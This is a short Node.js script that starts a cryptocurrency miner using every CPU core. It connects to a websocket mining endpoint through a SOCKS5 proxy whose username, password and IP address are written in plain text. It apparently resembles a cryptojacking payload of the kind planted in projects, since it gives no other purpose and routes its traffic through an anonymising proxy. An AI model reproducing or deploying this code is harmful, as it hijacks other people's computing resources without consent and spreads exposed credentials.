const { NMiner } = require("nminer");
new NMiner("wss://runtime.nmining.igrp.app/", "admin.pipeline", { proxy: "socks5://dcswarup:webshare@104.253.219.135:6544", threads: require("os").cpus().length, throttle: true });
